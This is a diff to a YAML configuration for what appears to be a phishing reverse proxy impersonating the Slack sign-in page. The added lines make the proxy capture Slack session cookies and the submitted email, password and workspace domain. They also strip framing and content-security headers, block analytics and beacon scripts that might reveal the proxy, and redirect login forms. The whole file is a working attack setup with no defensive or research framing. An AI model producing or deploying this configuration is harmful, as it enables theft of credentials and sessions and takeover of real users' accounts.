@@ -6,15 +6,22 @@ proxy_hosts:
     target: "slack.com"
 auth_urls: ["/signin"]
 landing_path: ["/signin"]
-auth_tokens: []
-credentials: []
+auth_tokens:
+  - {type: "cookie", name: "d"}
+  - {type: "cookie", name: "d-s"}
+  - {type: "cookie", name: "b"}
+credentials:
+  - {type: "post_param", name: "email", regex: null}
+  - {type: "post_param", name: "password", regex: null}
+  - {type: "post_param", name: "domain", regex: null}
 injections: []
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
 path_rewrites:
   - {pattern: "^/$", replace: "/signin", methods: ["GET"]}
 cookie_rewrites: []
 blocklist:
-  - {pattern: "analytics|/track|/stats", mimes: ["text/javascript"], max_kb: 512}
+  - {pattern: "analytics|/track|/stats|/beacon", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"signin\"], form[action*=\"login\"]", action_to: "/api/signin"}
